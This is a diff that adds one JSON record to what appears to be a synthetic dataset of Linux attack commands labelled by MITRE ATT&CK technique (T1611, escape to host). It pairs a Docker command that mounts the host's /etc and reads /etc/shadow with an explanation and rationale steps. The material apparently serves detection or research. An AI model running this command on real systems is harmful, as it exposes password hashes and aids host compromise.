@@ -1,0 +1,21 @@
+{
+  "id": "SYN-ZSH-T1611-f02cfc9c-7779d464",
+  "technique_id": "T1611",
+  "platform": "linux",
+  "shell": "zsh",
+  "command": "docker run --rm -v /etc:/mnt/etc ubuntu cat /mnt/etc/shadow",
+  "explanation": "Launches a container to mount and read the /etc directory from the host, specifically accessing the shadow file containing passwords.",
+  "rationale_steps": [
+    "Mount the host's /etc directory inside the container.",
+    "Read the shadow file to potentially access password hashes."
+  ],
+  "source_prompt_hash": "f02cfc9c",
+  "obfuscation_level": "none",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  },
+  "timestamp_utc": "2025-07-07T00:29:32.063558Z"
+}
